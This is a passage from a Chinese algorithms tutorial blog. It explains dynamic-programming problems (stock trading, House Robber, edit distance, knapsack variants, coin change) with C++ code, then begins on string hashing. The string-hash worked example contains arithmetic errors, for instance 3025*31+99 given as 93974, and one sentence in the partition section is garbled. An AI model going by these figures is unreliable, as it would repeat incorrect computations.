class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">f<span class="hljs-selector-attr">[i]</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-attr">[k]</span> = <span class="hljs-built_in">max</span>(f<span class="hljs-selector-attr">[i]</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-attr">[k]</span>, f<span class="hljs-selector-attr">[i-1]</span><span class="hljs-selector-attr">[1]</span><span class="hljs-selector-attr">[k]</span> + prices<span class="hljs-selector-attr">[i]</span>)<br></code></pre></td></tr></table></figure><ul><li>如果在第 <code>i</code> 天选择卖出股票，那么前一天的状态应该是持有股票且已完成 <code>k</code> 次交易，卖出后增加当天的价格 <code>prices[i]</code>。</li></ul></li><li><p>保持</p><p>：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">f<span class="hljs-comment">[i]</span><span class="hljs-comment">[j]</span><span class="hljs-comment">[k]</span> = f<span class="hljs-comment">[i-1]</span><span class="hljs-comment">[j]</span><span class="hljs-comment">[k]</span><br></code></pre></td></tr></table></figure><ul><li>不进行买卖操作，保持前一天的状态。</li></ul></li></ul><p>边界条件</p><ul><li><code>f[0][0][0] = 0</code> 表示在第 0 天，没有进行任何交易且不持有股票的情况下，利润为 0。</li><li>其余的边界值都初始化为负无穷，表示在开始时这些状态不合法或不可达。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;climits&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxProfit</span><span class="hljs-params">(<span class="hljs-type">int</span> c, std::vector&lt;<span class="hljs-type">int</span>&gt;&amp; prices)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = prices.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">// 移动索引到1开始</span><br>        prices.<span class="hljs-built_in">insert</span>(prices.<span class="hljs-built_in">begin</span>(), <span class="hljs-number">0</span>);<br><br>        <span class="hljs-comment">// 定义 f 数组并初始化为负无穷</span><br>        <span class="hljs-comment">// f[i][j][k] 表示第 i 天，持有 j (0 或 1) 股股票，已经交易了 k 次的最大收益</span><br>        std::vector&lt;std::vector&lt;std::vector&lt;<span class="hljs-type">int</span>&gt;&gt;&gt; <span class="hljs-built_in">f</span>(n + <span class="hljs-number">1</span>, std::vector&lt;std::vector&lt;<span class="hljs-type">int</span>&gt;&gt;(<span class="hljs-number">2</span>, std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(c + <span class="hljs-number">1</span>, <span class="hljs-number">-1e9</span>)));<br>        <br>        <span class="hljs-comment">// 边界条件</span><br>        f[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">// 遍历所有状态</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">2</span>; j++) &#123;<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;= c; k++) &#123;<br>                    <span class="hljs-comment">// 决策：不操作</span><br>                    f[i][j][k] = std::<span class="hljs-built_in">max</span>(f[i][j][k], f[i - <span class="hljs-number">1</span>][j][k]);<br>                    <br>                    <span class="hljs-comment">// 决策：买入</span><br>                    <span class="hljs-keyword">if</span> (j == <span class="hljs-number">1</span> &amp;&amp; k &gt; <span class="hljs-number">0</span>) &#123;<br>                        f[i][<span class="hljs-number">1</span>][k] = std::<span class="hljs-built_in">max</span>(f[i][<span class="hljs-number">1</span>][k], f[i - <span class="hljs-number">1</span>][<span class="hljs-number">0</span>][k - <span class="hljs-number">1</span>] - prices[i]);<br>                    &#125;<br>                    <br>                    <span class="hljs-comment">// 决策：卖出</span><br>                    <span class="hljs-keyword">if</span> (j == <span class="hljs-number">0</span> &amp;&amp; k &gt; <span class="hljs-number">0</span>) &#123;<br>                        f[i][<span class="hljs-number">0</span>][k] = std::<span class="hljs-built_in">max</span>(f[i][<span class="hljs-number">0</span>][k], f[i - <span class="hljs-number">1</span>][<span class="hljs-number">1</span>][k] + prices[i]);<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 找到最大的收益</span><br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">-1e9</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt;= c; k++) &#123;<br>            ans = std::<span class="hljs-built_in">max</span>(ans, f[n][<span class="hljs-number">0</span>][k]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h4 id="打家劫舍"><a href="#打家劫舍" class="headerlink" title="打家劫舍"></a>打家劫舍</h4><p>问题描述</p><ul><li>给定一排房子，每个房子都有一定的现金。如果两个相邻的房子都被盗，就会触发报警系统。求在不触发报警的情况下能够盗取的最大金额。</li></ul><p>状态定义</p><ul><li>设 f[i][j] 表示在第 i个房子时的最大收益：<ul><li><code>j = 0</code> 表示未盗窃第 <code>i</code> 个房子。</li><li><code>j = 1</code> 表示盗窃第 <code>i</code> 个房子。</li></ul></li></ul><p>状态转移方程</p><ul><li><code>f[i][0] = max(f[i - 1][0], f[i - 1][1])</code>：如果第 <code>i</code> 个房子没有被盗窃，那么最大收益就是前一个房子的状态（不管前一个房子是否被盗）。</li><li><code>f[i][1] = f[i - 1][0] + nums[i]</code>：如果第 <code>i</code> 个房子被盗窃，那么前一个房子一定没有被盗窃。</li></ul><p>边界条件</p><ul><li><code>f[0][0] = 0</code>：第一个房子不偷的收益为 0。</li><li><code>f[0][1] = nums[0]</code>：第一个房子偷的收益为 <code>nums[0]</code>。</li></ul><p>目标</p><ul><li>计算 <code>max(f[n][0], f[n][1])</code>，其中 <code>n</code> 是房子的数量，这样可以得到在最后一个房子时的最大收益。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">rob</span><span class="hljs-params">(std::vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">// 为方便使用1基索引，我们在开头插入0</span><br>        nums.<span class="hljs-built_in">insert</span>(nums.<span class="hljs-built_in">begin</span>(), <span class="hljs-number">0</span>);<br><br>        <span class="hljs-comment">// 定义f数组，并初始化为负无穷大（表示不可达状态）</span><br>        std::vector&lt;std::vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">f</span>(n + <span class="hljs-number">1</span>, std::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(<span class="hljs-number">2</span>, <span class="hljs-number">-1e9</span>));<br>        f[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">// 边界条件，第0天不偷的收益为0</span><br><br>        <span class="hljs-comment">// 动态规划填表</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>            <span class="hljs-comment">// 不偷第i个房子</span><br>            f[i][<span class="hljs-number">0</span>] = std::<span class="hljs-built_in">max</span>(f[i - <span class="hljs-number">1</span>][<span class="hljs-number">0</span>], f[i - <span class="hljs-number">1</span>][<span class="hljs-number">1</span>]);<br>            <span class="hljs-comment">// 偷第i个房子</span><br>            f[i][<span class="hljs-number">1</span>] = f[i - <span class="hljs-number">1</span>][<span class="hljs-number">0</span>] + nums[i];<br>        &#125;<br><br>        <span class="hljs-comment">// 返回最后一天不偷或偷的最大收益</span><br>        <span class="hljs-keyword">return</span> std::<span class="hljs-built_in">max</span>(f[n][<span class="hljs-number">0</span>], f[n][<span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;;<br><br><br></code></pre></td></tr></table></figure><h4 id="编辑距离"><a href="#编辑距离" class="headerlink" title="编辑距离"></a>编辑距离</h4><p>给定两个字符串 <code>word1</code> 和 <code>word2</code>，计算将 <code>word1</code> 转换成 <code>word2</code> 所使用的最小操作数。可以对字符串执行以下三种操作：</p><ol><li>插入一个字符</li><li>删除一个字符</li><li>替换一个字符</li></ol><p>状态定义</p><p>设 <code>f[i][j]</code> 表示 <code>word1</code> 前 <code>i</code> 个字符和 <code>word2</code> 前 <code>j</code> 个字符之间的编辑距离（最小操作数）。</p><p>状态转移方程</p><ul><li><strong>插入操作</strong>：<code>f[i][j] = f[i][j - 1] + 1</code><ul><li>相当于在 <code>word1</code> 中第 <code>i</code> 个位置插入 <code>word2[j]</code>，所以 <code>j</code> 减 1 后计算剩余的编辑距离，再加上插入操作的1。</li></ul></li><li><strong>删除操作</strong>：<code>f[i][j] = f[i - 1][j] + 1</code><ul><li>相当于删除 <code>word1[i]</code>，因此 <code>i</code> 减 1 后计算剩余的编辑距离，再加上删除操作的1。</li></ul></li><li><strong>替换操作</strong>（或不变）：<code>f[i][j] = f[i - 1][j - 1] + eq</code>，其中 <code>eq = 0</code> 或 <code>1</code><ul><li>如果 <code>word1[i]</code> 与 <code>word2[j]</code> 相等，<code>eq = 0</code>；否则，<code>eq = 1</code>，因为需要一次替换操作。</li></ul></li></ul><p>初始条件</p><ul><li><code>f[i][0] = i</code>：将 <code>word1</code> 的前 <code>i</code> 个字符转化为一个空字符串需要 <code>i</code> 次删除操作。</li><li><code>f[0][j] = j</code>：将空字符串转化为 <code>word2</code> 的前 <code>j</code> 个字符需要 <code>j</code> 次插入操作。</li></ul><p>目标</p><p>最终目标是计算 <code>f[n][m]</code>，其中 <code>n</code> 和 <code>m</code> 分别是 <code>word1</code> 和 <code>word2</code> 的长度。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br>public:<br>    <span class="hljs-type">int</span> <span class="hljs-title function_">minDistance</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> word1, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> word2)</span> &#123;<br>        <span class="hljs-type">int</span> n = word1.length();<br>        <span class="hljs-type">int</span> m = word2.length();<br>        <br>        <span class="hljs-comment">// 定义 f[i][j] 并初始化边界</span><br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&gt; f(n + <span class="hljs-number">1</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(m + <span class="hljs-number">1</span>, <span class="hljs-number">1e9</span>));<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= n; i++) f[i][<span class="hljs-number">0</span>] = i;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt;= m; j++) f[<span class="hljs-number">0</span>][j] = j;<br><br>        <span class="hljs-comment">// 计算编辑距离</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= m; j++) &#123;<br>                <span class="hljs-type">int</span> eq = (word1[i - <span class="hljs-number">1</span>] == word2[j - <span class="hljs-number">1</span>]) ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>;<br>                f[i][j] = <span class="hljs-built_in">std</span>::min(&#123;f[i][j - <span class="hljs-number">1</span>] + <span class="hljs-number">1</span>,    <span class="hljs-comment">// 插入</span><br>                                    f[i - <span class="hljs-number">1</span>][j] + <span class="hljs-number">1</span>,    <span class="hljs-comment">// 删除</span><br>                                    f[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>] + eq&#125;);  <span class="hljs-comment">// 替换或不变</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 返回最终的编辑距离</span><br>        <span class="hljs-keyword">return</span> f[n][m];<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h3 id="0-1-背包"><a href="#0-1-背包" class="headerlink" title="0&#x2F;1 背包"></a><strong>0&#x2F;1 背包</strong></h3><p>给定 <code>N</code> 个物品，每个物品有一定的体积 <code>V[i]</code> 和价值 <code>W[i]</code>。还有一个容量为 <code>M</code> 的背包，要求在背包容量不超过 <code>M</code> 的前提下，选择一些物品放入背包，使物品的总价值最大。</p><p>模版</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">knapsack</span><span class="hljs-params">(<span class="hljs-type">int</span> M, <span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp; V, <span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp; W)</span> </span>&#123;<br>    <span class="hljs-type">int</span> n = V.<span class="hljs-built_in">size</span>();<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">f</span><span class="hljs-params">(M + <span class="hljs-number">1</span>, <span class="hljs-number">-1e9</span>)</span></span>; <span class="hljs-comment">// 初始化为负无穷</span><br>    f[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">// 没有物品且容量为0的初始状态</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i) &#123; <span class="hljs-comment">// 遍历每个物品</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = M; j &gt;= V[i]; --j) &#123; <span class="hljs-comment">// 倒序遍历容量，确保每个物品仅选择一次</span><br>            f[j] = <span class="hljs-built_in">max</span>(f[j], f[j - V[i]] + W[i]);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 寻找容量为 M 时的最大价值</span><br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt;= M; ++j) &#123;<br>        ans = <span class="hljs-built_in">max</span>(ans, f[j]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="分割等和子集"><a href="#分割等和子集" class="headerlink" title="分割等和子集"></a>分割等和子集</h4><p>问题描述是：给定一个只包含正整数的非空数组，判断是否可以将数组分割成两个子集，使得两个子集的和相等。</p><p>这是一个典型的 0&#x2F;1 背包问题，问题可以转化为：是否可以从数组中选择一些数，使其和等于总和的一半。因为背包其实就是你看每个物品选不选?子集在一个核的限制下。选数的问题就跟背包一样，正好是选出来总体积为三-2这样的物品。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">canPartition</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums) sum += num;<br>        <span class="hljs-keyword">if</span> (sum % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-type">int</span> target = sum / <span class="hljs-number">2</span>;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">bool</span>&gt; <span class="hljs-title">f</span><span class="hljs-params">(target + <span class="hljs-number">1</span>, <span class="hljs-literal">false</span>)</span></span>;<br>        f[<span class="hljs-number">0</span>] = <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = target; j &gt;= num; --j) &#123;<br>                f[j] = f[j] || f[j - num];<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> f[target];<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h3 id="完全背包问题"><a href="#完全背包问题" class="headerlink" title="完全背包问题"></a><strong>完全背包问题</strong></h3><p>给定 NNN 种物品，其中第 iii 种物品的体积为 ViV_iVi，价值为 WiW_iWi，并且每种物品有无限个。现在有一个容量为 MMM 的背包，要求选择若干个物品放入背包中，使得物品的总体积不超过 MMM，并且物品的价值总和最大。</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; f(m + <span class="hljs-number">1</span>, <span class="hljs-number">-1000000000</span>); <span class="hljs-comment">// 初始化，容量为 m 的背包</span><br>f[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;      <span class="hljs-comment">// 遍历每一种物品</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = v[i]; j &lt;= m; j++) &#123; <span class="hljs-comment">// j 从 v[i] 到 m 顺序遍历</span><br>        f[j] = <span class="hljs-keyword">max</span>(f[j], f[j - v[i]] + w[i]); <span class="hljs-comment">// 更新当前容量 j 的最大值</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">int</span> ans = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt;= m; j++) &#123;<br>    ans = <span class="hljs-keyword">max</span>(ans, f[j]);<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="零钱兑换-Ii"><a href="#零钱兑换-Ii" class="headerlink" title="零钱兑换 Ii"></a>零钱兑换 Ii</h4><p>给定一个整数数组 <code>coins</code> 表示不同面额的硬币；以及一个整数 <code>amount</code>，表示总金额。</p><p>编写一个函数来计算可以凑成总金额的硬币组合数，假设每种硬币的数量是无限的。</p><p><strong>示例 1：</strong></p><ul><li>输入：<code>amount = 5, coins = [1, 2, 5]</code></li><li>输出：<code>4</code></li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title">change</span><span class="hljs-params">(<span class="hljs-type">int</span> amount, <span class="hljs-type">int</span>[] coins)</span> </span>&#123;<br>    <span class="hljs-type">int</span>[] f = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[amount + <span class="hljs-number">1</span>];<br>    Arrays.<span class="hljs-built_in">fill</span>(f, <span class="hljs-number">0</span>);<br>    f[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; coins.length; i++) &#123; <span class="hljs-comment">// 遍历每种硬币</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = coins[i]; j &lt;= amount; j++) &#123; <span class="hljs-comment">// 遍历从 coins[i] 到 amount 的金额</span><br>            f[j] += f[j - coins[i]]; <span class="hljs-comment">// 更新方法数量</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> f[amount];<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><h2 id="二十-字符串处理"><a href="#二十-字符串处理" class="headerlink" title="二十.字符串处理"></a>二十.字符串处理</h2><h3 id="字符串哈希"><a href="#字符串哈希" class="headerlink" title="字符串哈希"></a>字符串哈希</h3><p>判断子串是否相等</p><p>核心思想：将字符串看成P进制数，P的经验值是131或13331，取这两个值的冲突概率低<br>小技巧：取模的数用2^64，这样直接用unsigned long long存储，溢出的结果就是取模的结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">str = &quot;abcd&quot;，那么我们逐步计算哈希值和幂值。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">计算幂值数组 p（假设 P = 31）：</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">p[0] = 1</span><br><span class="hljs-comment">p[1] = P^1 = 31</span><br><span class="hljs-comment">p[2] = P^2 = 31 * 31 = 961</span><br><span class="hljs-comment">p[3] = P^3 = 31 * 961 = 29791</span><br><span class="hljs-comment">p[4] = P^4 = 31 * 29791 = 923521</span><br><span class="hljs-comment">计算哈希值数组 h： 假设 str = &quot;abcd&quot;，每个字符的 ASCII 码为：</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">a = 97</span><br><span class="hljs-comment">b = 98</span><br><span class="hljs-comment">c = 99</span><br><span class="hljs-comment">d = 100</span><br><span class="hljs-comment">我们通过递推计算 h[i]：</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">h[1] = 97 （字符串 &quot;a&quot; 的哈希值）</span><br><span class="hljs-comment">h[2] = h[1] * P + 98 = 97 * 31 + 98 = 3025 （字符串 &quot;ab&quot; 的哈希值）</span><br><span class="hljs-comment">h[3] = h[2] * P + 99 = 3025 * 31 + 99 = 93974 （字符串 &quot;abc&quot; 的哈希值）</span><br><span class="hljs-comment">h[4] = h[3] * P + 100 = 93974 * 31 + 100 = 2911064 （字符串 &quot;abcd&quot; 的哈希值）</span><br><span class="hljs-comment">哈希值的计算方式是递推的：假设我们知道 str[1..i-1] 的哈希值 h[i-1]，那么通过加上字符 str[i]，可以得到 str[1..i] 的哈希值：</span><br><span class="hljs-comment">h[i] = h[i - 1] * P + str[i];</span><br><span class="hljs-comment">当你需要计算某个子串 str[l..r] 的哈希值时，可以通过 h[r] 和 h[l-1] 的差值来计算：</span><br><span class="hljs-comment">ULL get(int l, int r) &#123;</span><br><span class="hljs-comment">    return h[r] - h[l - 1] * p[r - l + 1];</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">现在我们来计算 str[2..3] 也就是 &quot;bc&quot; 的哈希值。</span><br><span class="hljs-comment">计算子串 